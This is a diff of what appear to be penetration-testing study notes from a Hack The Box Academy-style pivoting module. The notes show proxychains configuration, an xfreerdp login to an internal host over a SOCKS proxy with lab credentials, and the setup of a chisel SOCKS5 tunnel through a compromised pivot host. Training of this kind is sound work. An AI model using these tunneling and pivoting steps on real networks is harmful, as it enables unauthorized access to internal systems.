+```bash
+[ProxyList]
+# add proxy here ...
+# meanwile
+# # defaults set to "tor"
+
+socks5 127.0.0.1 1080
+```
+
+</td>
+</tr>
+</table>
+
+**7. Use xfreerdp through proxychains to gain access to the target server**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+```
+
+</td>
+</tr>
+</table>
+
+</details>
+
+<details>
+<summary><h2>ICMP Tunneling with SOCKS</h2></summary>
 
 </details>
 
@@ -2429,18 +2676,20 @@ exec (OFFICEMANAGER) 1>
 
 ---
 
-# 1. Download the release binary
+<!-- # 1. Download the release binary
+
 wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
 
 # 2. Unzip it
+
 gzip -d chisel_1.9.1_linux_amd64.gz
 
 # 3. Rename it to 'chisel' and make it executable
+
 mv chisel_1.9.1_linux_amd64 chisel
 chmod +x chisel
 
 scp chisel ubuntu@10.129.2.82:~/
-
 
 ssh ubuntu@10.129.2.82
 
@@ -2464,20 +2713,33 @@ ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
 2026/01/21 20:47:31 client: Connected (Latency 66.442711ms)
 2026/01/21 20:47:31 client: tun: SSH connected
 
-
 ┌─[us-academy-1]─[10.10.15.206]─[htb-ac-1640397@htb-y2rf9tvyzk]─[~]
 └──╼ [★]$ tail -f /etc/proxychains.conf
-#       proxy types: http, socks4, socks5, raw
-#         * raw: The traffic is simply forwarded to the proxy without modification.
-#        ( auth types supported: "basic"-http  "user/pass"-socks )
-#
-[ProxyList]
-# add proxy here ...
-# meanwile
-# defaults set to "tor"
-socks4 	127.0.0.1 9050
 
+# proxy types: http, socks4, socks5, raw
+
+# \* raw: The traffic is simply forwarded to the proxy without modification.
+
+# ( auth types supported: "basic"-http "user/pass"-socks )
+
+#
+
+[ProxyList]
+
+# add proxy here ...
+
+# meanwile
+
+# defaults set to "tor"
+
+socks4 127.0.0.1 9050
 
 sudo nano /etc/proxychains.conf
 
 socks5 127.0.0.1 1080
+
+
+
+
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+ -->
